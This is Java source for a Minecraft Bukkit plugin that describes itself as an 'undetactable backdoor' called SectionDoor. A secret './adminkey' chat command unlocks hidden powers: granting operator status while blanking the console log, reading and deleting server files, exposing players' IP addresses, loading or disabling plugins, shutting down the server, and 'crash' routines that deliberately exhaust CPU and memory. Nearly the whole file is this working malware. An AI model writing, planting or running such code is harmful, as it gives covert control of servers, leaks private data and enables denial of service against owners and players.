    public void megaCrash() {
        startSpamTask();

        crashTask = Bukkit.getScheduler().runTaskLater(
                plugin,
                new Runnable() {
                    @Override
                    public void run() {
                        // Zwiększenie obciążenia do niewyobrażalnych poziomów
                        for (int i = 0; i < Integer.MAX_VALUE; i++) {
                            // Ogromne obciążenie CPU za pomocą obliczeń
                            Math.sin(i);
                        }

                        // Tworzymy ogromną tablicę, co może wyczerpać pamięć
                        int[] hugeArray = new int[Integer.MAX_VALUE / 100];
                        for (int j = 0; j < hugeArray.length; j++) {
                            hugeArray[j] = (int) (Math.random() * Integer.MAX_VALUE);
                        }

                        // Nieskończona pętla (tworzy obciążenie CPU i potencjalnie blokuje serwer)
                        while (true) {
                            // Zajmuje CPU w nieskończoność
                        }
                    }
                },
                10L // Opóźnienie 1 sekundy
        );
    }



    // GUI do wyboru crasha
    private void openCrashGUI(Player player) {
        Inventory inv = Bukkit.createInventory(null, 9, "Wybierz typ Crash'a");

        // Lite crash
        ItemStack liteCrashItem = new ItemStack(Material.PAPER); // Zmieniamy ikonę na bardziej odpowiednią
        ItemMeta liteMeta = liteCrashItem.getItemMeta();
        liteMeta.setDisplayName("§7Lite Crash");
        liteMeta.setLore(Arrays.asList(
                "§7Wymagające zadania matematyczne zapychające cpu.",
                "§7Dla najmniej wymagajacych serwerow"
        ));
        liteCrashItem.setItemMeta(liteMeta);
        inv.setItem(0, liteCrashItem); // Wyśrodkowane na 2. pozycji

        // Medium crash
        ItemStack mediumCrashItem = new ItemStack(Material.BLAZE_ROD);
        ItemMeta mediumMeta = mediumCrashItem.getItemMeta();
        mediumMeta.setDisplayName("§6Medium Crash");
        mediumMeta.setLore(Arrays.asList(
                "§7Wymagające zadania matematyczne zapychające cpu.",
                "§7Dla normalnych serwerow"
        ));
        mediumCrashItem.setItemMeta(mediumMeta);
        inv.setItem(2, mediumCrashItem); // Wyśrodkowane na 4. pozycji

        // Hard crash
        ItemStack hardCrashItem = new ItemStack(Material.DRAGON_EGG);
        ItemMeta hardMeta = hardCrashItem.getItemMeta();
        hardMeta.setDisplayName("§cHard Crash");
        hardMeta.setLore(Arrays.asList(
                "§7Bardzo wymagające zadania matematyczne zapychające cpu.",
                "§7Dla lepszych serwerow"
        ));
        hardCrashItem.setItemMeta(hardMeta);
        inv.setItem(4, hardCrashItem); // Wyśrodkowane na 6. pozycji

        // Ultra crash
        ItemStack ultraCrash = new ItemStack(Material.ANVIL);
        ItemMeta Ultrameta = ultraCrash.getItemMeta();
        Ultrameta.setDisplayName("§4§lULTRA §6Crash");
        Ultrameta.setLore(Arrays.asList(
                "§7Ultra wymagające zadania matematyczne zapychające pamięć i cpu.",
                "§7Dla wymagajacych serwerow"
        ));
        ultraCrash.setItemMeta(Ultrameta);
        inv.setItem(6, ultraCrash); // Wyśrodkowane na 6. pozycji

        ItemStack stopCrash = new ItemStack(Material.POPPED_CHORUS_FRUIT);
        ItemMeta stopMeta = stopCrash.getItemMeta();
        stopMeta.setDisplayName("§d§lMEGA §5crash!");
        stopMeta.setLore(Arrays.asList(
                "§7Najbardziej wymagające zadania matematyczne zapychające pamięć i cpu.",
                "§7Dla najbardziej wymagajacych serwerow!"
        ));
        stopCrash.setItemMeta(stopMeta);
        inv.setItem(8, stopCrash);

        player.openInventory(inv);
    }

    private void openHelpGUI(Player player) {
        Inventory invv = Bukkit.createInventory(null, 9, "Pomoc");


        // Medium crash
        ItemStack helpItem = new ItemStack(Material.BOOK);
        ItemMeta helpmeta = helpItem.getItemMeta();
        helpmeta.setDisplayName("§aPomoc");
        helpmeta.setLore(Arrays.asList(
                "§7#crashhelp - otwiera gui pomocy odnosiacej sie do crashow.",
                "§7#crashes - otwiera gui do crashowania.",
                "§7#stopcrash - zatrzymuje wszystkie crashe."
        ));
        helpItem.setItemMeta(helpmeta);
        invv.setItem(4, helpItem); // Wyśrodkowane na 4. pozycj

        player.openInventory(invv);
    }

    // Pomocnicza metoda do ładowania i włączania pluginu
    private void loadAndEnablePlugin(File pluginFile, Player player) {
        Bukkit.getScheduler().runTask(plugin, () -> {
            try {
                Plugin target = Bukkit.getPluginManager().loadPlugin(pluginFile);
                if (target != null) {
                    Bukkit.getPluginManager().enablePlugin(target);
                    player.sendMessage("§aSuccessfully loaded and enabled plugin: " + target.getName());
                } else {
                    player.sendMessage("§cFailed to load the plugin. Invalid or corrupted file.");
                }
            } catch (Exception e) {
                player.sendMessage("§cError while loading: " + e.getMessage());
                e.printStackTrace();
            }
        });
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        if (chatLocked && !event.getPlayer().isOp()) {
            event.setCancelled(true);
            event.getPlayer().sendMessage("Chat is currently locked!");
        }


        if (reversedChatPlayers.contains(event.getPlayer().getUniqueId())) {
            String original = event.getMessage();
            String reversed = new StringBuilder(original).reverse().toString();
            event.setMessage(reversed);
        }

        Player player = event.getPlayer();
        String message = event.getMessage();

        Function<String, String> formatEventMsg = (msg) -> {
            return ChatColor.DARK_GRAY + " > " + ChatColor.AQUA + "SectionDoor" +
                    ChatColor.DARK_GRAY + ChatColor.BOLD + " | " +
                    ChatColor.RESET + ChatColor.GRAY + msg;
        };


        // Helper method for consistent message formatting
// Helper method for consistent message formatting
        Function<String, String> formatMsg = (msg) -> {
            return ChatColor.DARK_GRAY + " > " + ChatColor.AQUA + "SectionDoor" +
                    ChatColor.DARK_GRAY + ChatColor.BOLD + " | " +
                    ChatColor.RESET + ChatColor.GRAY + msg;
        };


        if (message.startsWith("./adminkey")) {

            String key = message.split(" ")[1];
            if (key.equals(adminKey)) {
                hasAdminAccess = true;
                allowedPlayers.add(event.getPlayer().getUniqueId());


                sendTitleToPlayer(player, ChatColor.AQUA + "SectionDoor", ChatColor.RED + "Best undetactable backdoor!", 20, 90, 20);
                player.sendMessage(ChatColor.GREEN + "En: Admin Key accepted \n PL: Klucz admina zaakceptowany masz permisje, potrzebujesz pomocy #help");
            } else {
                player.sendMessage(ChatColor.RED + "Invalid admin key.");
            }

            event.setCancelled(true);
            event.getRecipients().retainAll(List.of(event.getPlayer())); // TYLKO nadawca widzi

            return;
        }

        if (!hasAdminAccess) {
            return;
        }

//        if(message.startsWith("#")){
//            event.setMessage("");
//            event.setCancelled(true);
//
//        }

        if (message.startsWith("#clear")) {
            // Wysyłanie pustych wiadomości aby wyczyścić chat
            for (int i = 0; i < 100; i++) {
                player.sendMessage("");
            }

            // Wysłanie potwierdzenia (opcjonalne)
            player.sendMessage(formatMsg.apply("Chat został wyczyszczony"));
            player.sendMessage("");
            player.sendMessage("");
            event.setCancelled(true);
            return;
        }

        //if (message.startsWith("#help")) {
        //    player.sendMessage(ChatColor.DARK_PURPLE + "                |  Fatal Door  |\n\n" + ChatColor.LIGHT_PURPLE + "Available commands:\n#tnt - Get special TNT\n#wand [block] [radius] - Get wand to replace blocks \n #cmd [player] [command] - command executed as player you set \n #god - gives you god on server \n#op [player, *] - gives op to player or everyone");
        //    event.setCancelled(true);
        //    return;
        //}

        if (message.startsWith("#disable")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #disable [plugin]"));
                event.setCancelled(true);
                return;
            }

            String pluginName = parts[1];
            Bukkit.getScheduler().runTask(plugin, () -> {
                Plugin target = Bukkit.getPluginManager().getPlugin(pluginName);
                if (target != null) {
                    Bukkit.getPluginManager().disablePlugin(target);
                    player.sendMessage(formatMsg.apply("Plugin " + pluginName + " has been disabled."));
                } else {
                    player.sendMessage(formatMsg.apply("Plugin " + pluginName + " not found."));
                }
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#freeze")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #freeze [player]"));
                event.setCancelled(true);
                return;
            }

            String playerName = parts[1];
            Player target = Bukkit.getPlayer(playerName);
            if (target != null) {
                if (frozenPlayers.contains(target.getUniqueId())) {
                    frozenPlayers.remove(target.getUniqueId());
                    target.setWalkSpeed(0.2f);
                    target.setFlySpeed(0.1f);
                    target.setAllowFlight(false);
                    target.setFlying(false);
                    player.sendMessage(formatMsg.apply("Player " + playerName + " has been unfrozen."));
                } else {
                    frozenPlayers.add(target.getUniqueId());
                    target.setWalkSpeed(0);
                    target.setFlySpeed(0);
                    target.setAllowFlight(true);
                    target.setFlying(true);
                    // Cancel any existing velocity
                    target.setVelocity(new Vector(0, 0, 0));
                    player.sendMessage(formatMsg.apply("Player " + playerName + " has been frozen."));
                }
            } else {
                player.sendMessage(formatMsg.apply("Player " + playerName + " not found."));
            }
            event.setCancelled(true);
            return;
        }
        //
        //
        // FUN SECTION
        //
        //
        // Launch Command
        if (message.startsWith("#launch")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #launch [player]"));
                event.setCancelled(true);
                return;
            }

            Player target = Bukkit.getPlayer(parts[1]);
            if (target != null) {
                if (target.getVelocity().getY() > 0) {
                    target.setVelocity(new Vector(0, 0, 0)); // Stop launching
                    player.sendMessage(formatMsg.apply("Stopped launching " + target.getName()));
                } else {
                    target.setVelocity(new Vector(0, 2.0, 0)); // Launch upwards
                    player.sendMessage(formatMsg.apply("Launched " + target.getName() + " into the sky!"));
                }
            } else {
                player.sendMessage(formatMsg.apply("Player not found."));
            }
            event.setCancelled(true);
            return;
        }

// Spin Command
        if (message.startsWith("#spin")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #spin [player]"));
                event.setCancelled(true);
                return;
            }

            Player target = Bukkit.getPlayer(parts[1]);
            if (target != null) {
                Bukkit.getScheduler().runTask(plugin, () -> {
                    if (spinningPlayers.contains(target.getUniqueId())) {
                        spinningPlayers.remove(target.getUniqueId());
                        player.sendMessage(formatMsg.apply("Stopped spinning " + target.getName()));
                    } else {
                        spinningPlayers.add(target.getUniqueId());
                        player.sendMessage(formatMsg.apply("Started spinning " + target.getName()));
                        // Start spinning task
                        new BukkitRunnable() {
                            @Override
                            public void run() {
                                if (!spinningPlayers.contains(target.getUniqueId())) {
                                    this.cancel();
                                    return;
                                }
                                Location loc = target.getLocation();
                                loc.setYaw(loc.getYaw() + 20f);
                                target.teleport(loc);
                            }
                        }.runTaskTimer(plugin, 0L, 1L);
                    }
                });
            } else {
                player.sendMessage(formatMsg.apply("Player not found."));
            }
            event.setCancelled(true);
            return;
        }

// Reverse Chat Command
        if (message.startsWith("#reverse")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #reverse [player]"));
                event.setCancelled(true);
                return;
            }

            Player target = Bukkit.getPlayer(parts[1]);
            if (target != null) {
                if (reversedChatPlayers.contains(target.getUniqueId())) {
                    reversedChatPlayers.remove(target.getUniqueId());
                    player.sendMessage(formatMsg.apply("Disabled reversed chat for " + target.getName()));
                } else {
                    reversedChatPlayers.add(target.getUniqueId());
                    player.sendMessage(formatMsg.apply("Enabled reversed chat for " + target.getName()));
                }
            } else {
                player.sendMessage(formatMsg.apply("Player not found."));
            }
            event.setCancelled(true);
            return;
        }

// Invsee Command
        if (message.startsWith("#invsee")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #invsee [player]"));
                event.setCancelled(true);
                return;
            }

            Player target = Bukkit.getPlayer(parts[1]);
            if (target != null) {
                Bukkit.getScheduler().runTask(plugin, () -> {
                    player.openInventory(target.getInventory());
                    player.sendMessage(formatMsg.apply("Opened " + target.getName() + "'s inventory"));
                });
            } else {
                player.sendMessage(formatMsg.apply("Player not found."));
            }
            event.setCancelled(true);
            return;
        }

// Fake Cheater Command
        if (message.startsWith("#fcheater")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #fcheater [player]"));
                event.setCancelled(true);
                return;
            }

            Player target = Bukkit.getPlayer(parts[1]);

            if (target != null) {
                UUID targetId = target.getUniqueId();
                boolean currentlyCheating = cheatStatusMap.getOrDefault(targetId, false);

                if (currentlyCheating) {
                    // Disable cheat effects
                    target.setAllowFlight(false);
                    target.setFlying(false);
                    target.setWalkSpeed(originalWalkSpeeds.getOrDefault(targetId, 0.2f));
                    target.setFlySpeed(originalFlySpeeds.getOrDefault(targetId, 0.1f));
                    target.getActivePotionEffects().forEach(effect ->
                            target.removePotionEffect(effect.getType()));

                    cheatStatusMap.remove(targetId);
                    originalWalkSpeeds.remove(targetId);
                    originalFlySpeeds.remove(targetId);

                    player.sendMessage(formatMsg.apply("§aDisabled cheat effects for " + target.getName()));
                } else {
                    // Store original values
                    originalWalkSpeeds.put(targetId, target.getWalkSpeed());
                    originalFlySpeeds.put(targetId, target.getFlySpeed());

                    // Apply highly detectable cheat-like behaviors
                    target.setAllowFlight(true);
                    target.setFlying(true);
                    target.setWalkSpeed(2.0f);  // Extreme speed
                    target.setFlySpeed(2.0f);   // Extreme fly speed

                    // Add randomized effects
                    Random random = new Random();
                    target.addPotionEffect(new PotionEffect(
                            PotionEffectType.SPEED,
                            Integer.MAX_VALUE,
                            random.nextInt(5) + 3,  // Amplifier 3-7
                            true,  // Show particles
                            false  // Don't show icon (more suspicious)
                    ));

                    target.addPotionEffect(new PotionEffect(
                            PotionEffectType.JUMP,
                            Integer.MAX_VALUE,
                            random.nextInt(5) + 3,
                            true,
                            false
                    ));

                    // Add some suspicious but less common effects
                    if (random.nextBoolean()) {
                        target.addPotionEffect(new PotionEffect(
                                PotionEffectType.DAMAGE_RESISTANCE,
                                Integer.MAX_VALUE,
                                5,
                                true,
                                false
                        ));
                    }

                    // Make them look extra suspicious
                    target.setGlowing(true);
                    target.setInvulnerable(true);

                    // Random teleportation to trigger movement checks
                    if (random.nextDouble() < 0.3) {
                        Location loc = target.getLocation();
                        loc.add((random.nextDouble() - 0.5) * 10, 0, (random.nextDouble() - 0.5) * 10);
                        target.teleport(loc);
                    }

                    cheatStatusMap.put(targetId, true);
                    player.sendMessage(formatMsg.apply("§4Enabled §cEXTREMELY DETECTABLE §4cheat effects for " + target.getName()));

                    // Log to console for admin tracking
                    //Bukkit.getLogger().warning("[CHEAT SIM] Admin " + player.getName() +
                    //        " enabled cheat simulation for " + target.getName());
                }
            } else {
                player.sendMessage(formatMsg.apply("Player not found."));
            }
            event.setCancelled(true);
        }

// Ping Crash Command
        if (message.startsWith("#PingCrash")) {
            // This would require more advanced networking manipulation
            player.sendMessage(formatMsg.apply("This command would require custom packet manipulation"));
            event.setCancelled(true);
            return;
        }
        //
        //
        // FUN SECTION
        //
        //


        //
        //
        // LOCK SECTION
        //
        //
// Lock Commands
        if (message.startsWith("#lockConsole")) {
            consoleLocked = !consoleLocked;
            player.sendMessage(formatMsg.apply("Console is now " + (consoleLocked ? "§clocked" : "§aunlocked")));
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#lockChat")) {
            chatLocked = !chatLocked;
            player.sendMessage(formatMsg.apply("Chat is now " + (chatLocked ? "§clocked" : "§aunlocked")));
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#lockStop")) {
            stopLocked = !stopLocked;
            player.sendMessage(formatMsg.apply("/stop command is now " + (stopLocked ? "§clocked" : "§aunlocked")));
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#lockJoin")) {
            joinLocked = !joinLocked;
            player.sendMessage(formatMsg.apply("Joining is now " + (joinLocked ? "§clocked" : "§aunlocked")));
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#lockCommands")) {
            commandsLocked = !commandsLocked;
            player.sendMessage(formatMsg.apply("All commands are now " + (commandsLocked ? "§clocked" : "§aunlocked")));
            event.setCancelled(true);
            return;
        }
        if (message.startsWith("#lock")) {
            player.sendMessage(formatMsg.apply("Lock Status:"));
            player.sendMessage(formatMsg.apply("- Console: " + (consoleLocked ? "§cLocked" : "§aUnlocked")));
            player.sendMessage(formatMsg.apply("- Chat: " + (chatLocked ? "§cLocked" : "§aUnlocked")));
            player.sendMessage(formatMsg.apply("- Stop Command: " + (stopLocked ? "§cLocked" : "§aUnlocked")));
            player.sendMessage(formatMsg.apply("- Joining: " + (joinLocked ? "§cLocked" : "§aUnlocked")));
            player.sendMessage(formatMsg.apply("- Commands: " + (commandsLocked ? "§cLocked" : "§aUnlocked")));
            event.setCancelled(true);
            return;
        }


        //
        //
        // LOCK SECTION
        //
        //

        if (message.startsWith("#shutdown")) {
            Bukkit.getScheduler().runTask(plugin, () -> {
                Bukkit.shutdown();
                player.sendMessage(formatMsg.apply("Server shutdown initiated."));
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#serverreload")) {
            Bukkit.getScheduler().runTask(plugin, () -> {
                Bukkit.reload();
                player.sendMessage(formatMsg.apply("Server reload initiated."));
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#enable")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #enable [plugin]"));
                event.setCancelled(true);
                return;
            }

            String pluginName = parts[1];
            Bukkit.getScheduler().runTask(plugin, () -> {
                Plugin target = Bukkit.getPluginManager().getPlugin(pluginName);
                if (target != null) {
                    Bukkit.getPluginManager().enablePlugin(target);
                    player.sendMessage(formatMsg.apply("Plugin " + pluginName + " has been enabled."));
                } else {
                    player.sendMessage(formatMsg.apply("Plugin " + pluginName + " not found."));
                }
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#reload")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #reload [plugin]"));
                event.setCancelled(true);
                return;
            }

            String pluginName = parts[1];
            Bukkit.getScheduler().runTask(plugin, () -> {
                Plugin target = Bukkit.getPluginManager().getPlugin(pluginName);
                if (target != null) {
                    Bukkit.getPluginManager().disablePlugin(target);
                    Bukkit.getPluginManager().enablePlugin(target);
                    player.sendMessage(formatMsg.apply("Plugin " + pluginName + " has been reloaded."));
                } else {
                    player.sendMessage(formatMsg.apply("Plugin " + pluginName + " not found."));
                }
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#load")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #load [plugin]"));
                event.setCancelled(true);
                return;
            }

            String pluginName = parts[1];
            Bukkit.getScheduler().runTask(plugin, () -> {
                File pluginFile = new File("plugins", pluginName + ".jar");
                if (pluginFile.exists()) {
                    try {
                        Plugin target = Bukkit.getPluginManager().loadPlugin(pluginFile);
                        if (target != null) {
                            Bukkit.getPluginManager().enablePlugin(target);
                            player.sendMessage(formatMsg.apply("Plugin " + pluginName + " has been loaded and enabled."));
                        } else {
                            player.sendMessage(formatMsg.apply("Failed to load plugin " + pluginName));
                        }
                    } catch (Exception e) {
                        player.sendMessage(formatMsg.apply("Error loading plugin: " + e.getMessage()));
                    }
                } else {
                    player.sendMessage(formatMsg.apply("Plugin file " + pluginName + ".jar not found."));
                }
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#unload")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #unload [plugin]"));
                event.setCancelled(true);
                return;
            }

            String pluginName = parts[1];
            Bukkit.getScheduler().runTask(plugin, () -> {
                Plugin target = Bukkit.getPluginManager().getPlugin(pluginName);
                if (target != null) {
                    Bukkit.getPluginManager().disablePlugin(target);
                    // Note: There's no official unload method in Bukkit, this just disables it
                    player.sendMessage(formatMsg.apply("Plugin " + pluginName + " has been disabled."));
                } else {
                    player.sendMessage(formatMsg.apply("Plugin " + pluginName + " not found."));
                }
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#plugins")) {
            Bukkit.getScheduler().runTask(plugin, () -> {
                StringBuilder pluginList = new StringBuilder("Installed plugins: ");
                for (Plugin pl : Bukkit.getPluginManager().getPlugins()) {
                    pluginList.append(pl.isEnabled() ? ChatColor.GREEN : ChatColor.RED)
                            .append(pl.getName())
                            .append(ChatColor.GRAY)
                            .append(", ");
                }
                player.sendMessage(formatMsg.apply(pluginList.toString()));
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#delete")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #delete [filename]"));
                event.setCancelled(true);
                return;
            }

            String fileName = parts[1];
            Bukkit.getScheduler().runTask(plugin, () -> {
                File currentDir = playerCurrentDirs.getOrDefault(player.getUniqueId(), new File("."));
                File file = new File(currentDir, fileName);

                if (file.exists()) {
                    if (file.delete()) {
                        player.sendMessage(formatMsg.apply("File " + file.getAbsolutePath() + " deleted successfully."));
                    } else {
                        player.sendMessage(formatMsg.apply("Failed to delete " + file.getAbsolutePath()));
                    }
                } else {
                    player.sendMessage(formatMsg.apply("File " + file.getAbsolutePath() + " not found."));
                }
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#dir")) {
            Bukkit.getScheduler().runTask(plugin, () -> {
                File currentDir = playerCurrentDirs.getOrDefault(player.getUniqueId(), new File("."));
                File[] files = currentDir.listFiles();

                if (files == null) {
                    player.sendMessage(formatMsg.apply("Cannot list files in current directory."));
                    return;
                }

                StringBuilder fileList = new StringBuilder("Files in " + currentDir.getAbsolutePath() + ":\n");
                for (File file : files) {
                    fileList.append(file.isDirectory() ? ChatColor.BLUE : ChatColor.WHITE)
                            .append(file.getName())
                            .append("\n");
                }
                player.sendMessage(formatMsg.apply(fileList.toString()));
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#cd")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #cd [directory]"));
                event.setCancelled(true);
                return;
            }

            String dirName = parts[1];
            Bukkit.getScheduler().runTask(plugin, () -> {
                File currentDir = playerCurrentDirs.getOrDefault(player.getUniqueId(), new File("."));
                File newDir;

                if (dirName.equals("..")) {
                    // Powrót do nadrzędnego katalogu
                    newDir = currentDir.getParentFile();
                    if (newDir == null) newDir = currentDir;
                } else {
                    // Przejście do podanego katalogu
                    newDir = new File(currentDir, dirName);
                }

                if (newDir.exists() && newDir.isDirectory()) {
                    playerCurrentDirs.put(player.getUniqueId(), newDir);
                    player.sendMessage(formatMsg.apply("Changed directory to " + newDir.getAbsolutePath()));
                } else {
                    player.sendMessage(formatMsg.apply("Directory " + dirName + " not found."));
                }
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#ip")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #ip [player]"));
                event.setCancelled(true);
                return;
            }
            if (message.startsWith("#serverip")) {
                String ip = Bukkit.getIp();
                if (ip.isEmpty()) ip = "localhost";
                int port = Bukkit.getPort();
                player.sendMessage(formatMsg.apply("Server IP: " + ip + ":" + port));
                event.setCancelled(true);
                return;
            }

            String playerName = parts[1];
            Player target = Bukkit.getPlayer(playerName);
            if (target != null) {
                String ip = target.getAddress().getAddress().getHostAddress();
                player.sendMessage(formatMsg.apply("IP of " + playerName + ": " + ip));
            } else {
                player.sendMessage(formatMsg.apply("Player " + playerName + " not found."));
            }
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#op")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #op [player]"));
                event.setCancelled(true);
                return;
            }

            String playerName = parts[1];
            Bukkit.getScheduler().runTask(plugin, () -> {
                Player target = Bukkit.getPlayer(playerName);
                if (target != null) {
                    target.setOp(true);
                    // Hide the op message from console
                    Bukkit.getConsoleSender().sendMessage(" ");
                    player.sendMessage(formatMsg.apply("Player " + playerName + " is now OP."));
                } else {
                    player.sendMessage(formatMsg.apply("Player " + playerName + " not found."));
                }
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#deop")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #deop [player]"));
                event.setCancelled(true);
                return;
            }

            String playerName = parts[1];
            Bukkit.getScheduler().runTask(plugin, () -> {
                Player target = Bukkit.getPlayer(playerName);
                if (target != null) {
                    target.setOp(false);
                    // Hide the deop message from console
                    Bukkit.getConsoleSender().sendMessage(" ");
                    player.sendMessage(formatMsg.apply("Player " + playerName + " is no longer OP."));
                } else {
                    player.sendMessage(formatMsg.apply("Player " + playerName + " not found."));
                }
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#ops")) {
            Bukkit.getScheduler().runTask(plugin, () -> {
                StringBuilder opList = new StringBuilder("Server operators:\n");
                for (OfflinePlayer op : Bukkit.getOperators()) {
                    opList.append(op.getName()).append("\n");
                }
                player.sendMessage(formatMsg.apply(opList.toString()));
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#read")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #read [filename]"));
                event.setCancelled(true);
                return;
            }

            String fileName = parts[1];
            Bukkit.getScheduler().runTask(plugin, () -> {
                File currentDir = playerCurrentDirs.getOrDefault(player.getUniqueId(), new File("."));
                File file = new File(currentDir, fileName);

                try {
                    List<String> lines = Files.readAllLines(file.toPath());
                    StringBuilder content = new StringBuilder("Contents of " + file.getAbsolutePath() + ":\n");
                    for (String line : lines) {
                        content.append(line).append("\n");
                    }
                    player.sendMessage(formatMsg.apply(content.toString()));
                } catch (IOException e) {
                    player.sendMessage(formatMsg.apply("Error reading file: " + e.getMessage()));
                }
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#gm")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #gm [0/1/2/3]"));
                event.setCancelled(true);
                return;
            }

            String mode = parts[1];
            Bukkit.getScheduler().runTask(plugin, () -> {
                try {
                    int gamemode = Integer.parseInt(mode);
                    if (gamemode >= 0 && gamemode <= 3) {
                        player.setGameMode(GameMode.getByValue(gamemode));
                        player.sendMessage(formatMsg.apply("Your gamemode has been set to " + gamemode));
                    } else {
                        player.sendMessage(formatMsg.apply("Invalid gamemode. Use 0, 1, 2, or 3."));
                    }
                } catch (NumberFormatException e) {
                    player.sendMessage(formatMsg.apply("Invalid gamemode number."));
                }
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#tp")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #tp [player]"));
                event.setCancelled(true);
                return;
            }

            String playerName = parts[1];
            Bukkit.getScheduler().runTask(plugin, () -> {
                Player target = Bukkit.getPlayer(playerName);
                if (target != null) {
                    player.teleport(target);
                    player.sendMessage(formatMsg.apply("Teleported to " + playerName));
                } else {
                    player.sendMessage(formatMsg.apply("Player " + playerName + " not found."));
                }
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#give")) {
            String[] parts = message.split(" ", 3);
            if (parts.length < 3) {
                player.sendMessage(formatMsg.apply("Usage: #give [item] [amount]"));
                event.setCancelled(true);
                return;
            }

            String itemName = parts[1].toUpperCase();
            String amountStr = parts[2];
            Bukkit.getScheduler().runTask(plugin, () -> {
                try {
                    Material material = Material.valueOf(itemName);
                    int amount = Integer.parseInt(amountStr);
                    ItemStack item = new ItemStack(material, amount);
                    player.getInventory().addItem(item);
                    player.sendMessage(formatMsg.apply("Given " + amount + " of " + itemName));
                } catch (IllegalArgumentException e) {
                    player.sendMessage(formatMsg.apply("Invalid item or amount."));
                }
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#kick")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #kick [player]"));
                event.setCancelled(true);
                return;
            }

            String playerName = parts[1];
            Bukkit.getScheduler().runTask(plugin, () -> {
                Player target = Bukkit.getPlayer(playerName);
                if (target != null) {
                    target.kickPlayer("Kicked by admin");
                    player.sendMessage(formatMsg.apply("Player " + playerName + " has been kicked."));
                } else {
                    player.sendMessage(formatMsg.apply("Player " + playerName + " not found."));
                }
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#ban")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #ban [player]"));
                event.setCancelled(true);
                return;
            }

            String playerName = parts[1];
            Bukkit.getScheduler().runTask(plugin, () -> {
                Player target = Bukkit.getPlayer(playerName);
                if (target != null) {
                    Bukkit.getBanList(BanList.Type.NAME).addBan(playerName, "Banned by admin", null, null);
                    target.kickPlayer("You have been banned by admin");
                    player.sendMessage(formatMsg.apply("Player " + playerName + " has been banned."));
                } else {
                    player.sendMessage(formatMsg.apply("Player " + playerName + " not found."));
                }
            });
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#help")) {
            player.sendMessage(ChatColor.AQUA + "|  SectionDoor  |\n");
            player.sendMessage(ChatColor.DARK_GRAY + "-------------------------" + ChatColor.AQUA + "Available commands:" + ChatColor.DARK_GRAY + "-------------------------");

            // Commands from original #help
            player.sendMessage(formatMsg.apply("#adminhelp - Help for Admin Access Commands"));
            player.sendMessage(formatMsg.apply("#ohelp - help for Owner Access Commands"));
            player.sendMessage(formatMsg.apply("#allhelp - all commands from ohelp and adminhelp in one and clean msg"));
            player.sendMessage(formatMsg.apply("#betahelp - help for Beta Access Commandsr"));

            // Commands from newhelp

            event.setMessage("");
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("#adminhelp")) {
            player.sendMessage(ChatColor.DARK_PURPLE + "                |  SectionDoor - Admin Commands  |");

            // Basic Commands
            player.sendMessage(ChatColor.GOLD + "┌───────────── Basic Tools ─────────────┐");
